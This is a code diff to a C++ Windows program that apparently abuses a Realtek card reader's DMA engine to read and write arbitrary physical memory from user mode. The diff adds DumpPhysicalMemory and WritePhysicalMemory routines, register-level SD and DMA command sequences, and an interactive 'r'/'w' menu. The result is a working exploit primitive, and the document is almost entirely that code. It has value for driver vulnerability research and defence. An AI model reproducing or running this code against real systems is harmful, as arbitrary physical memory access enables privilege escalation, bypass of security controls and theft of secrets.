@@ -43,7 +43,7 @@ DWORD _bswap32(DWORD a)
     return a;
 }
 
-VOID DumpMemory(LPVOID Address, DWORD Length)
+VOID PrintBuffer(LPVOID Address, DWORD Length)
 {
     BYTE* ptr = (BYTE*)Address;
     for (SIZE_T i = 0; i < Length; i += 0x10)
@@ -552,24 +552,26 @@ VOID DoDmaTransfer(HANDLE hDev)
     }
 }
 
-BOOL ReadToPhysicalMemory(HANDLE hDev, DWORD PhysAddr, DWORD Lba)
+BOOL WritePhysicalMemory(HANDLE hDev, DWORD PhysAddr, DWORD Lba)
 {
     RtsEnableCprm(hDev);
     RtsResetCard(hDev);
-
-    RtsResetBuffer(hDev);
-
-    BYTE Lba0, Lba1, Lba2, Lba3;
-    Lba0 = static_cast<BYTE>(Lba);
-    Lba1 = static_cast<BYTE>(Lba >> 8);
-    Lba2 = static_cast<BYTE>(Lba >> 16);
-    Lba3 = static_cast<BYTE>(Lba >> 24);
 
     // Step 1: execute SCSI command
     //
     // Registers 0xFDA9–0xFDAD (SD_CMD0–4) hold the SCSI command code and parameters.
     // 0x40 marks the start of the SCSI command, and 0x11 encodes the READ_SINGLE_BLOCK SCSI command
     //
+
+    // FIX: move it to a function
+    BYTE Lba0, Lba1, Lba2, Lba3;
+    Lba0 = static_cast<BYTE>(Lba);
+    Lba1 = static_cast<BYTE>(Lba >> 8);
+    Lba2 = static_cast<BYTE>(Lba >> 16);
+    Lba3 = static_cast<BYTE>(Lba >> 24);
+
+    RtsResetBuffer(hDev);
+
     RtsAddInstr(hDev, OP_WRITE, 0xFDA9, 0xFFu, 0x40 | 0x11); //SD_CMD0
     RtsAddInstr(hDev, OP_WRITE, 0xFDAA, 0xFFu, Lba3); //SD_CMD1
     RtsAddInstr(hDev, OP_WRITE, 0xFDAB, 0xFFu, Lba2); //SD_CMD2
@@ -642,11 +644,117 @@ BOOL ReadToPhysicalMemory(HANDLE hDev, DWORD PhysAddr, DWORD Lba)
     return r;
 }
 
+BOOL DumpPhysicalMemory(HANDLE hDev, DWORD PhysAddr, DWORD Lba)
+{
+    RtsEnableCprm(hDev);
+    RtsResetCard(hDev);
+
+
+    // Step 1: execute SCSI command
+    //
+    // Registers 0xFDA9–0xFDAD (SD_CMD0–4) hold the SCSI command code and parameters.
+    // 0x40 marks the start of the SCSI command, and 0x18 encodes the WRITE_SINGLE_BLOCK SCSI command
+    //
+
+    // FIX: move it to a function
+    BYTE Lba0, Lba1, Lba2, Lba3;
+    Lba0 = static_cast<BYTE>(Lba);
+    Lba1 = static_cast<BYTE>(Lba >> 8);
+    Lba2 = static_cast<BYTE>(Lba >> 16);
+    Lba3 = static_cast<BYTE>(Lba >> 24);
+
+    RtsResetBuffer(hDev);
+
+    RtsAddInstr(hDev, OP_WRITE, 0xFDA9, 0xFFu, 0x40 | 0x18); //SD_CMD0
+    RtsAddInstr(hDev, OP_WRITE, 0xFDAA, 0xFFu, Lba3); //SD_CMD1
+    RtsAddInstr(hDev, OP_WRITE, 0xFDAB, 0xFFu, Lba2); //SD_CMD2
+    RtsAddInstr(hDev, OP_WRITE, 0xFDAC, 0xFFu, Lba1); //SD_CMD3
+    RtsAddInstr(hDev, OP_WRITE, 0xFDAD, 0xFFu, Lba0); //SD_CMD4
+
+    RtsAddInstr(hDev, OP_WRITE, 0xFDA1, 0xFFu, 0x1); //SD_CFG2 : RTSX_SD_RSP_TYPE_R1
+
+    RtsAddInstr(hDev, OP_WRITE, 0xFD5B, 1, 1); //CARD_DATA_SOURCE : 1 : RTSX_PINGPONG_BUFFER
+
+    RtsAddInstr(hDev, OP_WRITE, 0xFDB3, 0xFFu, 0x80 | 0x8); //SD_TRANSFER : RTSX_TM_CMD_RSP | SD_TRANSFER_START
+    RtsAddInstr(hDev, OP_CHECK, 0xFDB3, 0x40u, 0x40); //SD_TRANSFER : SD_TRANSFER_END | RTSX_SD_STAT_IDLE
+
+    RtsAddInstr(hDev, OP_READ, 0xFDA9, 0, 0);
+    RtsAddInstr(hDev, OP_READ, 0xFDAA, 0, 0);
+    RtsAddInstr(hDev, OP_READ, 0xFDAB, 0, 0);
+    RtsAddInstr(hDev, OP_READ, 0xFDAC, 0, 0);
+    RtsAddInstr(hDev, OP_READ, 0xFDAD, 0, 0);
+
+    RtsAddInstr(hDev, OP_READ, 0xFDA3, 0, 0);
+
+    // Execute added instructions and wait for an interrupt
+    RtsExecBuffer(hDev);
+
+    RtsResetBuffer(hDev);
+    RtsAddInstr(hDev, OP_WRITE, 0xFDAF, 0xFFu, 0x00); //SD_BYTE_CNT_L
+    RtsAddInstr(hDev, OP_WRITE, 0xFDB0, 0xFFu, 0x2); //SD_BYTE_CNT_H
+    RtsAddInstr(hDev, OP_WRITE, 0xFDB1, 0xFFu, 0x1); //SD_BLOCK_CNT_L
+    RtsAddInstr(hDev, OP_WRITE, 0xFDB2, 0xFFu, 0x0); //SD_BLOCK_CNT_H
+
+    // DMA transfer length (DMATC0-3) and DMA config
+    RtsAddInstr(hDev, OP_WRITE, 0xFE21, 0x80u, 0x80u); //IRQSTAT0 : 0x80 : DMA_DONE_INT
+    RtsAddInstr(hDev, OP_WRITE, 0xFE2B, 0xFFu, 0); //DMATC3
+    RtsAddInstr(hDev, OP_WRITE, 0xFE2A, 0xFFu, 0); //DMATC2
+    RtsAddInstr(hDev, OP_WRITE, 0xFE29, 0xFFu, 2); //DMATC1
+    RtsAddInstr(hDev, OP_WRITE, 0xFE28, 0xFFu, 0); //DMATC0
+    //DMACTL : 0x33, 0x23 : DMA_EN | RTSX_DMA_DIR | RTSX_DMA_PACK_SIZE_MASK : DMA_EN | RTSX_DMA_DIR_TO_CARD | RTSX_DMA_512
+    RtsAddInstr(hDev, OP_WRITE, 0xFE2C, 0x1 | 0x2 | 0x30, 0x1 | 0x0 | 0x20);
+
+    RtsAddInstr(hDev, OP_WRITE, 0xFD5B, 1, 0); //CARD_DATA_SOURCE : 0 : RTSX_RING_BUFFER
+
+    RtsAddInstr(hDev, OP_WRITE, 0xFDA1, 0xFFu, 0x80 | 0x4); //SD_CFG2 : RTSX_SD_CHECK_CRC16 | RTSX_SD_NO_WAIT_BUSY_END | RTSX_SD_RSP_LEN_0 | RTSX_SD_NO_CALCULATE_CRC7 | RTSX_SD_NO_CHECK_CRC7
+    RtsAddInstr(hDev, OP_WRITE, 0xFDB3, 0xFFu, 0x80 | 0x1); //SD_TRANSFER : RTSX_TM_AUTO_WRITE3 | RTSX_SD_TRANSFER_START
+    RtsAddInstr(hDev, OP_CHECK, 0xFDB3, 0x40u, 0x40); //SD_TRANSFER : RTSX_SD_TRANSFER_END, RTSX_SD_TRANSFER_END
+
+    ExecBufferAsynch(hDev);
+
+    //
+    // Step 2: configure and trigger DMA transfer
+    //
+
+    RtsResetBuffer(hDev);
+
+    //
+    // Create a DMA descriptor in the command buffer with two DWORD writes:
+    // 1. Flags and transfer length
+    // 2. Physical address of the transfer destintation
+    //
+    DWORD LengthFlags = 0x02000023;
+    BOOL r = WriteValueBuffer(hDev, LengthFlags);
+    if (r == FALSE)
+    {
+        printf("The length/flags %x of the DMA desc can't be encoded\n", LengthFlags);
+        return r;
+    }
+
+    r = WriteValueBuffer(hDev, PhysAddr);
+    if (r == FALSE)
+    {
+        printf("The physical address %x of the DMA desc can't be encoded\n", 0);
+        return r;
+    }
+
+    //
+    // Trigger DMA transfer.
+    // Normally transfers end with an interrupt, but as a user-mode app we can't detect it, so we just hope it worked
+    //
+    if (r == TRUE)
+    {
+        DoDmaTransfer(hDev);
+    }
+
+    return r;
+}
+
 //
-// Minimal test.
+// Minimal read test.
 // Programs the card reader to execute a READ_SINGLE_BLOCK command using the ping-pong buffer and fetches its contents
 //
-VOID MinimalTest(HANDLE hDev)
+VOID MinimalReadTest(HANDLE hDev)
 {
     RtsEnableCprm(hDev);
     RtsResetCard(hDev);
@@ -699,13 +807,169 @@ VOID MinimalTest(HANDLE hDev)
         RtsFetchBuffer(hDev, i, &Resp[i]);
     }
 
-    DumpMemory(Resp, 0x80);
+    PrintBuffer(Resp, 0x80);
+}
+
+//
+// Minimal write test.
+// Programs the card reader to execute a WRITE_SINGLE_BLOCK to write 256 bytes of 
+// the ping-pong buffer to the secotr 1
+//
+VOID MinimalWriteTest(HANDLE hDev)
+{
+    RtsEnableCprm(hDev);
+    RtsResetCard(hDev);
+
+    RtsResetBuffer(hDev);
+
+    RtsAddInstr(hDev, OP_WRITE, 0xFDA9, 0xFFu, 0x40 | 0x18); //SD_CMD0
+    RtsAddInstr(hDev, OP_WRITE, 0xFDAA, 0xFFu, 0x0); //SD_CMD1
+    RtsAddInstr(hDev, OP_WRITE, 0xFDAB, 0xFFu, 0x0); //SD_CMD2
+    RtsAddInstr(hDev, OP_WRITE, 0xFDAC, 0xFFu, 0x0); //SD_CMD3
+    RtsAddInstr(hDev, OP_WRITE, 0xFDAD, 0xFFu, 0x1); //SD_CMD4
+
+    //rtsx_push_cmd(sc, RTSX_WRITE_REG_CMD, RTSX_SD_CFG2, 0xff, rsp_type);
+    RtsAddInstr(hDev, OP_WRITE, 0xFDA1, 0xFFu, 0x1); //SD_CFG2 : RTSX_SD_RSP_TYPE_R1
+
+    RtsAddInstr(hDev, OP_WRITE, 0xFD5B, 1, 1); //CARD_DATA_SOURCE : 1 : RTSX_PINGPONG_BUFFER
+
+    RtsAddInstr(hDev, OP_WRITE, 0xFDB3, 0xFFu, 0x80 | 0x8); //SD_TRANSFER : RTSX_TM_CMD_RSP | SD_TRANSFER_START
+    RtsAddInstr(hDev, OP_CHECK, 0xFDB3, 0x40u, 0x40); //SD_TRANSFER : SD_TRANSFER_END | RTSX_SD_STAT_IDLE
+
+    RtsAddInstr(hDev, OP_READ, 0xFDA9, 0, 0);
+    RtsAddInstr(hDev, OP_READ, 0xFDAA, 0, 0);
+    RtsAddInstr(hDev, OP_READ, 0xFDAB, 0, 0);
+    RtsAddInstr(hDev, OP_READ, 0xFDAC, 0, 0);
+    RtsAddInstr(hDev, OP_READ, 0xFDAD, 0, 0);
+
+    RtsAddInstr(hDev, OP_READ, 0xFDA3, 0, 0);
+
+    // Execute added instructions and wait for an interrupt
+    RtsExecBuffer(hDev);
+
+    RtsResetBuffer(hDev);
+    for (DWORD i = 0; i < 256; i++)
+    {
+        RtsAddInstr(hDev, OP_WRITE, (WORD)(0xFA00 + i), 0xFF, 0xAB);
+    }
+    RtsExecBuffer(hDev);
+
+
+    RtsResetBuffer(hDev);
+    RtsAddInstr(hDev, OP_WRITE, 0xFDAF, 0xFFu, 0x00); //SD_BYTE_CNT_L
+    RtsAddInstr(hDev, OP_WRITE, 0xFDB0, 0xFFu, 0x2); //SD_BYTE_CNT_H
+    RtsAddInstr(hDev, OP_WRITE, 0xFDB1, 0xFFu, 0x1); //SD_BLOCK_CNT_L
+    RtsAddInstr(hDev, OP_WRITE, 0xFDB2, 0xFFu, 0x0); //SD_BLOCK_CNT_H
+
+    RtsAddInstr(hDev, OP_WRITE, 0xFDA1, 0xFFu, 0x0); //SD_CFG2 : RTSX_SD_CALCULATE_CRC7 | RTSX_SD_CHECK_CRC16 | RTSX_SD_NO_WAIT_BUSY_END | RTSX_SD_CHECK_CRC7 | RTSX_SD_RSP_LEN_0
+    RtsAddInstr(hDev, OP_WRITE, 0xFDB3, 0xFFu, 0x80 | 0x1); //SD_TRANSFER : RTSX_TM_AUTO_WRITE3 | RTSX_SD_TRANSFER_START
+    RtsAddInstr(hDev, OP_CHECK, 0xFDB3, 0x40u, 0x40); //SD_TRANSFER : RTSX_SD_TRANSFER_END, RTSX_SD_TRANSFER_END
+
+    RtsExecBuffer(hDev);
+}
+
+BOOL ReadHexValue(PDWORD Value, DWORD Default)
+{
+    char Buffer[64];
+
+    *Value = Default;
+    if (fgets(Buffer, sizeof(Buffer), stdin) == NULL)
+    {
+        return FALSE;
+    }
+
+    if (Buffer[0] == '\n')
+    {
+        return FALSE;
+    }
+
+    if (sscanf(Buffer, "%x", Value) == 1)
+    {
+        return TRUE;
+    }
+
+    return FALSE;
+}
+
+VOID WritePhysicalMemoryCmd(HANDLE hDev)
+{
+    DWORD TargetAddress;
+    DWORD Lba;
+
+    printf("Enter physical address to write to: ");
+    BOOL GotAddress = ReadHexValue(&TargetAddress, _bswap32(g_CmdBufPhysAddr));
+    if (GotAddress != TRUE)
+    {
+        printf("No physical address, setting to %x\n", TargetAddress);
+    }
+
+    printf("Enter sector address to read from: ");
+    BOOL r = ReadHexValue(&Lba, 0);
+    {
+        printf("No sector address, setting to %x\n", Lba);
+    }
+
+    printf("Reading from sector %x to physical memory address %x\n", Lba, TargetAddress);
+    r = WritePhysicalMemory(hDev, TargetAddress, Lba);
+    if (r == TRUE)
+    {
+        printf("DMA transfer started, check target memory\n");
+    }
+    else
+    {
+        printf("DMA transfer failed, saving log\n");
+        SaveLog(hDev);
+    }
+
+    // If the command buffer was the target, copy it
+    if (GotAddress == FALSE)
+    {
+        BYTE Resp[0x100];
+
+        printf("Fetching data from command buffer\n");
+        RtlZeroMemory(Resp, 0x100);
+        for (DWORD i = 0; i <= 0xFF; i++)
+        {
+            RtsFetchBuffer(hDev, i, &Resp[i]);
+        }
+        PrintBuffer(Resp, 0x100);
+    }
+}
+
+VOID DumpPhysicalMemoryCmd(HANDLE hDev)
+{
+    DWORD SourceAddress;
+    DWORD Lba;
+
+    printf("Enter physical address to dump from: ");
+    BOOL r = ReadHexValue(&SourceAddress, 0x1000);
+    if (r != TRUE)
+    {
+        printf("No physical address, setting to %x\n", SourceAddress);
+    }
+
+    printf("Enter sector address: ");
+    r = ReadHexValue(&Lba, 0x1);
+    if (r != TRUE)
+    {
+        printf("No sector address, setting to %x\n", Lba);
+    }
+
+    printf("Reading from physical memory address %x to sector %x to \n", SourceAddress, Lba);
+    r = DumpPhysicalMemory(hDev, SourceAddress, Lba);
+    if (r == TRUE)
+    {
+        printf("DMA transfer started, check target sector\n");
+    }
+    else
+    {
+        printf("DMA transfer failed, saving log\n");
+        SaveLog(hDev);
+    }
 }
 
 int main(int argc, char** argv)
 {
-    DWORD TargetAddress;
-    DWORD SectorAddress;
     HANDLE hDev = OpenDeivce();
 
     if (hDev == INVALID_HANDLE_VALUE)
@@ -719,50 +983,26 @@ int main(int argc, char** argv)
 
     for (;;)
     {
-        printf("Enter physical address: ");
-        int sr = scanf("%x", &TargetAddress);
-        if (sr != 1)
-        {
-            // Use command buffer as target if user didn’t provide an address
-            TargetAddress = _bswap32(g_CmdBufPhysAddr);
-            printf("No physical address, setting to %x\n", TargetAddress);
-        }
+        printf("Commands:\n"
+            "r for read from physical memory\n"
+            "w for write to physical memory\n"
+            "Enter command: ");
+        BYTE cmd = getchar();
+        getchar(); //consume \n
 
-        printf("Enter sector address: ");
-        sr = scanf("%x", &SectorAddress);
-        if (sr != 1)
+        if (cmd == 'r')
         {
-            SectorAddress = 0;
-            printf("No sector address, setting to 0\n");
+            DumpPhysicalMemoryCmd(hDev);
         }
-
-        printf("Reading from sector %x to physical memory address %x\n", SectorAddress, TargetAddress);
-        BOOL r = ReadToPhysicalMemory(hDev, TargetAddress, SectorAddress);
-        if (r == TRUE)
+        else if (cmd == 'w')
         {
-            printf("DMA transfer started, check target memory\n");
+            WritePhysicalMemoryCmd(hDev);
         }
         else
         {
-            printf("DMA transfer failed, saving log\n");
-            SaveLog(hDev);
-        }
-        
-        // If the command buffer was the target, copy it
-        if (_bswap32(TargetAddress) == g_CmdBufPhysAddr)
-        {
-            BYTE Resp[0x100];
-
-            printf("Fetching data from command buffer\n");
-            RtlZeroMemory(Resp, 0x100);
-            for (BYTE i = 0; i <= 0xFF; i++)
-            {
-                RtsFetchBuffer(hDev, i, &Resp[i]);
-            }
-            DumpMemory(Resp, 0x100);
+            printf("Unknown command\n");
         }
 
-        getchar();
     }
 
     CloseHandle(hDev);
